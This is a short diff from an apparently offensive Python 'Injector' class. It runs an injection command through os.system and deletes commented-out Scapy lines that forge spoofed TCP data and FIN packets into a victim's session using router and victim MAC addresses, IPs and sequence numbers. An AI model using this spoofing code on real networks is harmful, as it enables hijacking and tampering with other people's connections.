@@ -237,17 +237,7 @@ class Injector:
 			cmd+=injection
 			cmd+='" >/dev/null 2>&1'
 			os.system(cmd)
-
-#			packet=RadioTap()/Dot11(FCfield='to-DS',type='Data',addr1=rtrmac,addr2="94:db:c9:b7:da:c0",addr3=vicmac)/LLC()/SNAP()/IP(dst=vicip,src=svrip)/TCP(flags="PA",sport=int(svrport),dport=int(vicport),seq=int(seqnum),ack=int(acknum))/Raw(load=injection)
-#			try:
-#				sendp(packet,iface=self.interface,verbose=1)
-	#			sendp(FIN,iface=self.interface,verbose=0)
-#			except:
-#				raise
-#			packet=RadioEther(dst=vicmac,src=rtrmac)/IP(dst=vicip,src=svrip)/TCP(flags="PA",sport=int(svrport),dport=int(vicport),seq=int(seqnum),ack=int(acknum))/Raw(load=injection)
-#		FIN=RadioTap()/Dot11(FCfield='to-DS',addr1=rtrmac,addr2=vicmac,addr3=rtrmac)/LLC()/SNAP()/IP(dst=svrip,src=vicip)/TCP(sport=vicport, dport=svrport, flags="FA", ack=seqnum+1, seq = acknum)
-#		packet=Ether(src=rtrmac,dst=vicmac)/IP(dst=vicip,src=svrip)/TCP(flags="PA",sport=int(svrport),dport=int(vicport),seq=int(seqnum),ack=int(acknum))/Raw(load=injection)
-#		print cmd
+	#		print cmd
 		
 
 
